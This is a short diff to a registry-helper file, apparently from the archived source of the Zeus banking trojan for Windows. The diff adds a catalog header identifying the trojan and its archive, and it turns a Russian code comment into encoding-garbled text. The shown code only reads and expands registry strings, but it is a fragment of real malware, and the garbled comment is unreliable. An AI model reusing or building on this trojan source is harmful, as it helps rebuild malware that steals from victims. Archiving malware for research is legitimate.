@@ -1,3 +1,14 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "registry.h"
@@ -39,7 +50,7 @@ DWORD Registry::_getValueAsString(HKEY key, const LPWSTR subKey, const LPWSTR va
       else goto BAD_END;
     }
 
-    if(size > 2/*мин. разме меременной 3 символа*/ && type == REG_EXPAND_SZ)
+    if(size > 2/*пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 3 пїЅпїЅпїЅпїЅпїЅпїЅпїЅ*/ && type == REG_EXPAND_SZ)
     {
       LPWSTR tmpBuf = Str::_CopyExW(buffer, size);
       if(tmpBuf == NULL || CWA(kernel32, ExpandEnvironmentStringsW)(tmpBuf, buffer, bufferSize) == 0)size = (DWORD)-1;
